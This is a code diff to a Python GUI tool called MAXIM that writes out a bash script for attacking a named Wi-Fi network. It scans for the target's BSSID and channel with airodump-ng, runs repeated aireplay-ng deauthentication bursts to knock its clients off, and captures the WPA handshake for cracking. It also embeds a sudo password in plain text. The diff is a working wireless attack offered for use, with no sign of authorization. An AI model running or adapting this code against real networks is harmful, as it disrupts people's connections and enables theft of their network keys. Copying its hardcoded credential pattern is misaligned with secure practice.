@@ -1100,25 +1100,67 @@ class MaximWindow(QMainWindow):
         except FileNotFoundError:
             pass
 
-        # Build script that runs wifite targeting this ESSID
+        # Manual airodump+aireplay — NO wifite (it kills NetworkManager internally)
+        # This approach never touches wlan0 or NetworkManager
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
         script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
         script.write(f"mkdir -p '{essid_dir}'\n")
-        script.write(f"rm -f '{signal_file}'\n")
-        script.write(f"cd '{essid_dir}'\n\n")
+        script.write(f"rm -f '{signal_file}'\n\n")
 
-        # Set up monitor mode on wlan1 only — wlan0 untouched
+        # Monitor mode on wlan1 only — NO airmon-ng check kill
         script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
         script.write(f"sudo iw dev {iface} set type monitor 2>/dev/null\n")
         script.write(f"sudo ip link set {iface} up 2>/dev/null\n\n")
 
-        # wifite: scan + capture + deauth — wlan1 only, no --kill
-        script.write(f"sudo wifite -i {iface} --essid '{essid}' --wpa --no-pmkid --num-deauths 10\n\n")
+        # Quick silent scan to find BSSID+channel (no ncurses, output to /dev/null)
+        scan_csv = "/tmp/maxim_hscan"
+        script.write(f"rm -f {scan_csv}-* 2>/dev/null\n")
+        script.write(f"echo 'Scanning for {essid}...'\n")
+        script.write("BSSID=''\nCHANNEL=''\n")
+        script.write("for i in 1 2 3; do\n")
+        script.write(f"  sudo timeout 15 airodump-ng -w '{scan_csv}' --output-format csv --write-interval 1 {iface} >/dev/null 2>&1\n")
+        script.write(f"  CSV=$(ls -t {scan_csv}-*.csv 2>/dev/null | head -1)\n")
+        script.write("  if [ -n \"$CSV\" ]; then\n")
+        script.write(f"    LINE=$(grep -i '{essid}' \"$CSV\" | grep -E '^[0-9A-Fa-f]{{2}}:' | head -1)\n")
+        script.write("    if [ -n \"$LINE\" ]; then\n")
+        script.write("      BSSID=$(echo \"$LINE\" | cut -d, -f1 | tr -d ' ')\n")
+        script.write("      CH=$(echo \"$LINE\" | cut -d, -f4 | tr -d ' ')\n")
+        script.write("      if echo \"$CH\" | grep -qE '^[0-9]+$' && [ \"$CH\" -ge 1 ] && [ \"$CH\" -le 165 ]; then\n")
+        script.write("        CHANNEL=$CH\n")
+        script.write("      fi\n")
+        script.write("    fi\n")
+        script.write("  fi\n")
+        script.write(f"  rm -f {scan_csv}-* 2>/dev/null\n")
+        script.write("  if [ -n \"$BSSID\" ] && [ -n \"$CHANNEL\" ]; then break; fi\n")
+        script.write("  echo \"  Retry $i...\"\n")
+        script.write("done\n\n")
 
-        # If wifite exits, write signal so poller knows
+        script.write("if [ -z \"$BSSID\" ] || [ -z \"$CHANNEL\" ]; then\n")
+        script.write(f"  echo 'Could not find {essid}'\n")
+        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
+        script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")
+
+        script.write("echo \"Found: BSSID=$BSSID  Channel=$CHANNEL\"\necho\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
+        script.write("echo \"  BSSID: $BSSID  Channel: $CHANNEL\"\n")
+        script.write("echo '  MAXIM auto-detects handshake and starts cracking.'\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write("echo\n\n")
+
+        # Background: broadcast deauth to AP only (aireplay-ng -a BSSID, no -c)
+        # This deauths clients of MAX only, does NOT affect other networks
+        script.write("(\n  sleep 3\n  for j in $(seq 1 30); do\n")
+        script.write(f"    sudo aireplay-ng --deauth 5 -a $BSSID {iface} >/dev/null 2>&1\n")
+        script.write("    sleep 5\n  done\n) &\n\n")
+
+        # Foreground: capture on the target channel+BSSID
+        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' {iface}\n\n")
+
+        # If user closes terminal manually
         script.write(f"echo 'DONE' > '{signal_file}'\n")
-        script.write("echo\necho 'wifite finished.'\nread -p 'Press Enter to close'\n")
+        script.write("echo 'Capture stopped.'\nread -p 'Press Enter to close'\n")
 
         script.close()
         os.chmod(script.name, 0o755)
